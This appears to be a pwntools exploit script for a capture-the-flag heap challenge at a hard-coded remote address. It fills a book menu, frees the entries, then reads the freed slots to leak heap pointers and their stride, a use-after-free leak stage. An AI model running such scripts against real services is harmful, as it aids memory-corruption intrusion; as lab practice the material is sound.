from pwn import *

io = remote('152.118.201.241', 3025)

def add(idx, title, page):
    io.sendlineafter(b'> ', b'1')
    io.sendlineafter(b'?: ', str(idx).encode())
    io.sendlineafter(b'Title: ', title)
    io.sendlineafter(b'Page: ', str(page).encode())

def read(idx):
    io.sendlineafter(b'> ', b'2')
    io.sendlineafter(b'?: ', str(idx).encode())
    io.recvuntil(b'Title: ')
    title = io.recvline().strip()
    return title

for i in range(5):
    add(i, f'Title{i}'.encode(), i)

for i in range(5):
    io.sendlineafter(b'> ', b'3')
    io.sendlineafter(b'?: ', str(i).encode())

addr1 = u64(read(4).ljust(8, b'\x00'))
addr2 = u64(read(3).ljust(8, b'\x00'))
addr3 = u64(read(2).ljust(8, b'\x00'))

print(f"P4 points to: {hex(addr1)}")
print(f"P3 points to: {hex(addr2)}")
print(f"P2 points to: {hex(addr3)}")

print(f"Difference (stride): {hex(addr1 - addr2)}")

io.close()
